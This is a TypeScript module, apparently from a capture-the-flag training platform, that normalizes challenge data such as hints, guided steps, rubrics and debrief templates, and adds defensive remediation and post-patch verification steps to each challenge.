function buildDebriefTemplate(challenge: CtfChallengeSeed): CtfDebriefTemplateSeed {
    return {
        rootCausePrompt: `Explain why ${challenge.vulnerabilityType} was reachable and which control failed first.`,
        impactPrompt: 'Quantify business impact (fraud, compliance exposure, operational risk) with scope and severity.',
        mitigationPrompt: 'List prioritized mitigations with owner and timeline (immediate, short-term, structural).',
        evidencePrompt: 'Reference concrete artifacts (commands, logs, traces) proving exploit and post-patch protection.',
        checklist: [
            'Root cause explained with technical mechanism.',
            'Impact statement includes scope and severity.',
            'At least two prioritized mitigations are defined.',
            'Before/after validation evidence is attached.',
        ],
    };
}

function normalizeMissionBrief(challenge: CtfChallengeSeed): CtfMissionBriefSeed {
    const fallback = buildMissionBrief(challenge);
    const source = challenge.missionBrief || fallback;

    return {
        role: normalizeWhitespace(source.role || fallback.role),
        businessContext: normalizeWhitespace(source.businessContext || fallback.businessContext),
        incidentTrigger: normalizeWhitespace(source.incidentTrigger || fallback.incidentTrigger),
        objective: normalizeWhitespace(source.objective || fallback.objective),
        successCriteria: normalizeWhitespace(source.successCriteria || fallback.successCriteria),
    };
}

function normalizeIncidentArtifacts(challenge: CtfChallengeSeed): CtfIncidentArtifactSeed[] {
    const fallbackArtifacts = buildIncidentArtifacts(challenge);
    const sourceArtifacts = Array.isArray(challenge.incidentArtifacts) && challenge.incidentArtifacts.length > 0
        ? challenge.incidentArtifacts
        : fallbackArtifacts;

    return sourceArtifacts
        .map((artifact, index) => ({
            artifactId: normalizeWhitespace(artifact.artifactId || `${challenge.code}-artifact-${index + 1}`),
            artifactType: artifact.artifactType || 'LOG',
            title: normalizeWhitespace(artifact.title || `Artifact ${index + 1}`),
            description: normalizeWhitespace(artifact.description || 'Incident artifact'),
            sample: normalizeWhitespace(artifact.sample || 'n/a'),
        }))
        .slice(0, Math.max(2, sourceArtifacts.length));
}

function normalizeProofRubric(challenge: CtfChallengeSeed): CtfProofRubricSeed {
    const source = challenge.proofRubric || DEFAULT_PROOF_RUBRIC;

    const normalizeCriteria = (entries: CtfRubricCriterionSeed[]): CtfRubricCriterionSeed[] => entries.map((entry) => ({
        criterion: normalizeWhitespace(entry.criterion),
        weight: Math.max(0, Math.min(100, Math.round(entry.weight))),
        description: normalizeWhitespace(entry.description),
    }));

    return {
        technical: normalizeCriteria(source.technical && source.technical.length > 0 ? source.technical : DEFAULT_PROOF_RUBRIC.technical),
        communication: normalizeCriteria(source.communication && source.communication.length > 0 ? source.communication : DEFAULT_PROOF_RUBRIC.communication),
        passingScore: Math.max(50, Math.min(100, Math.round(source.passingScore || DEFAULT_PROOF_RUBRIC.passingScore))),
    };
}

function normalizeDebriefTemplate(challenge: CtfChallengeSeed): CtfDebriefTemplateSeed {
    const fallback = buildDebriefTemplate(challenge);
    const source = challenge.debriefTemplate || fallback;

    const checklist = Array.isArray(source.checklist) && source.checklist.length > 0
        ? source.checklist
        : fallback.checklist;

    return {
        rootCausePrompt: normalizeWhitespace(source.rootCausePrompt || fallback.rootCausePrompt),
        impactPrompt: normalizeWhitespace(source.impactPrompt || fallback.impactPrompt),
        mitigationPrompt: normalizeWhitespace(source.mitigationPrompt || fallback.mitigationPrompt),
        evidencePrompt: normalizeWhitespace(source.evidencePrompt || fallback.evidencePrompt),
        checklist: checklist.map((item) => normalizeWhitespace(item)).filter(Boolean),
    };
}

function normalizeHints(challenge: CtfChallengeSeed): CtfHintSeed[] {
    const customHints = Array.isArray(challenge.hints) ? challenge.hints : [];
    if (customHints.length > 0) {
        return customHints
            .slice(0, 3)
            .map((hint, index) => {
                const hintNumber = index + 1;
                const rawText = String(hint?.hintText || '');
                const rawCost = Number(hint?.costPoints || 0);

                if (hintNumber === 1) {
                    return {
                        hintNumber,
                        hintText: sanitizeLevel1Hint(rawText),
                        costPoints: HINT_LEVEL_1_COST,
                    };
                }

                if (hintNumber === 2) {
                    return {
                        hintNumber,
                        hintText: sanitizeHint(rawText, 'Use protocol-aware enumeration and inspect raw responses.'),
                        costPoints: sanitizeLevel2Cost(rawCost),
                    };
                }

                return {
                    hintNumber,
                    hintText: sanitizeHint(rawText, 'Capture reproducible technical evidence and explain impact.'),
                    costPoints: HINT_LEVEL_3_COST,
                };
            });
    }

    const attackClass = CATEGORY_ATTACK_CLASS[challenge.category];
    const tools = CATEGORY_TOOL_HINT[challenge.category];
    const evidenceArea = CATEGORY_EVIDENCE_AREA[challenge.category];

    return [
        {
            hintNumber: 1,
            hintText: `L1 Orientation: Classe d attaque: ${attackClass}. Cartographiez d abord la surface exposee.`,
            costPoints: HINT_LEVEL_1_COST,
        },
        {
            hintNumber: 2,
            hintText: `L2 Technique: Outils suggérés: ${tools}. Utilisez-les pour énumérer et tester, sans payload prêt-à-l-emploi.`,
            costPoints: HINT_LEVEL_2_COST,
        },
        {
            hintNumber: 3,
            hintText: `L3 Preuve: ${evidenceArea}`,
            costPoints: HINT_LEVEL_3_COST,
        },
    ];
}

function normalizeGuidedStep(step: CtfGuidedStepSeed): CtfGuidedStepSeed {
    return {
        ...step,
        stepTitle: normalizeWhitespace(step.stepTitle),
        stepDescription: normalizeWhitespace(step.stepDescription),
        commandTemplate: step.commandTemplate ? normalizeWhitespace(step.commandTemplate) : undefined,
        expectedOutput: step.expectedOutput ? normalizeWhitespace(step.expectedOutput) : undefined,
        hintText: step.hintText ? normalizeWhitespace(step.hintText) : undefined,
    };
}

function buildRealisticGuidedSteps(challenge: CtfChallengeSeed): CtfGuidedStepSeed[] {
    return [
        {
            stepNumber: 1,
            stepTitle: 'Reconnaissance reseau',
            stepDescription: 'Identifiez d abord les hôtes actifs et les ports exposés dans la zone cible sans supposer les noms DNS.',
            stepType: 'EXPLANATION',
            hintText: 'Commencez par une découverte réseau puis restreignez la cible.',
        },
        {
            stepNumber: 2,
            stepTitle: 'Enumeration services et endpoints',
            stepDescription: 'Dressez l inventaire des services accessibles puis des routes utiles sans dépendre d un chemin prédéfini.',
            stepType: 'EXPLANATION',
            hintText: 'Confirmez la méthode HTTP, le code de réponse et le comportement anormal.',
        },
        {
            stepNumber: 3,
            stepTitle: 'Identification de la vulnerabilite',
            stepDescription: `Validez techniquement la faiblesse (${challenge.vulnerabilityType}) avec un test reproductible et minimal.`,
            stepType: 'ANALYSIS',
            hintText: 'Documentez exactement quel contrôle manque ou se comporte mal.',
        },
        {
            stepNumber: 4,
            stepTitle: 'Exploitation controlee',
            stepDescription: 'Exploitez la faiblesse de manière contrôlée pour obtenir une preuve d impact sans dégrader le service.',
            stepType: 'EXPLOITATION',
        },
        {
            stepNumber: 5,
            stepTitle: 'Collecte de preuve',
            stepDescription: 'Capturez la preuve exploitable (requête, réponse, métrique, trace réseau ou log) et liez-la à votre identifiant étudiant.',
            stepType: 'OBSERVATION',
            hintText: 'La preuve doit être vérifiable et horodatée.',
        },
        {
            stepNumber: 6,
            stepTitle: 'Analyse post-exploitation',
            stepDescription: 'Expliquez l impact métier, la cause racine et les priorités de remédiation défensive.',
            stepType: 'EXPLANATION',
        },
    ];
}

function isRemediationStep(step: CtfGuidedStepSeed): boolean {
    return step.stepTitle.toLowerCase() === 'remediation defensive';
}

function isPostPatchVerificationStep(step: CtfGuidedStepSeed): boolean {
    return step.stepTitle.toLowerCase() === 'verification post-patch avant/apres';
}

function findLastExploitationIndex(steps: CtfGuidedStepSeed[]): number {
    for (let index = steps.length - 1; index >= 0; index -= 1) {
        if (steps[index].stepType === 'EXPLOITATION') {
            return index;
        }
    }

    return steps.length - 1;
}

function buildRemediationStep(challenge: CtfChallengeSeed): CtfGuidedStepSeed {
    return {
        stepNumber: 0,
        stepTitle: 'Remediation defensive',
        stepDescription: normalizeWhitespace(
            `Appliquez un correctif defensif pour neutraliser ${challenge.vulnerabilityType}. ` +
            'Traitez la cause racine, ajoutez un controle preventif et documentez le changement.'
        ),
        stepType: 'EXPLANATION',
        hintText: 'Priorisez un correctif qui bloque l attaque sans casser le flux legitime.',
    };
}

function buildPostPatchVerificationStep(challenge: CtfChallengeSeed): CtfGuidedStepSeed {
    return {
        stepNumber: 0,
        stepTitle: 'Verification post-patch avant/apres',
        stepDescription: normalizeWhitespace(
            'Executez le meme test d attaque que vous avez identifie avant puis apres avoir applique le correctif. ' +
            'Avant patch, la faille doit etre exploitable. Apres patch, l exploitation doit echouer et le flux legitime doit rester valide.'
        ),
        stepType: 'ANALYSIS',
        commandTemplate: 'echo "Before patch: exploit should succeed"; echo "After patch: exploit should fail with 4xx/blocked response";',
        expectedOutput: 'Avant patch: exploitation validee. Apres patch: exploitation bloquee + fonctionnement legitime confirme.',
        hintText: 'Conservez une preuve comparative avant/apres pour valider la correction.',
    };
}

function reindexSteps(steps: CtfGuidedStepSeed[]): CtfGuidedStepSeed[] {
    return steps.map((step, index) => ({
        ...step,
        stepNumber: index + 1,
    }));
}

function normalizeGuidedSteps(challenge: CtfChallengeSeed): CtfGuidedStepSeed[] {
    const hasCustomSteps = Array.isArray(challenge.guidedSteps) && challenge.guidedSteps.length > 0;
    const sourceSteps = hasCustomSteps
        ? challenge.guidedSteps
        : buildRealisticGuidedSteps(challenge);
    const normalized = sourceSteps.map(normalizeGuidedStep);

    if (hasCustomSteps) {
        return reindexSteps(normalized);
    }

    const hasRemediation = normalized.some(isRemediationStep);
    const hasPostPatchVerification = normalized.some(isPostPatchVerificationStep);
    const insertionIndex = Math.max(0, findLastExploitationIndex(normalized));

    if (!hasRemediation) {
        normalized.splice(insertionIndex + 1, 0, buildRemediationStep(challenge));
    }

    if (!hasPostPatchVerification) {
        const remediationIndex = normalized.findIndex(isRemediationStep);
        const verificationInsertionIndex = remediationIndex >= 0 ? remediationIndex + 1 : normalized.length;
        normalized.splice(verificationInsertionIndex, 0, buildPostPatchVerificationStep(challenge));
    }

    return reindexSteps(normalized);
}

function normalizeChallenge(challenge: CtfChallengeSeed): CtfChallengeSeed {
    const initialDefaults: Record<string, Record<string, boolean>> = {};

    return {
        ...challenge,
        workflowMode: challenge.workflowMode === 'TASK_VALIDATION' ? 'TASK_VALIDATION' : 'FLAG_ONLY',
        hints: normalizeHints(challenge),
        guidedSteps: normalizeGuidedSteps(challenge),
        missionBrief: normalizeMissionBrief(challenge),
        incidentArtifacts: normalizeIncidentArtifacts(challenge),
        proofRubric: normalizeProofRubric(challenge),
        debriefTemplate: normalizeDebriefTemplate(challenge),
        initialVulnConfig: {
            ...(initialDefaults[challenge.code] || {}),
            ...(challenge.initialVulnConfig || {}),
        },
    };
}

export const CTF_CHALLENGES: CtfChallengeSeed[] = RAW_CTF_CHALLENGES.map(normalizeChallenge);
export const CTF_CHALLENGE_BY_CODE = new Map(CTF_CHALLENGES.map((challenge) => [challenge.code, challenge]));

export const CTF_TOTAL_ACTIVE_CHALLENGES = CTF_CHALLENGES.length;
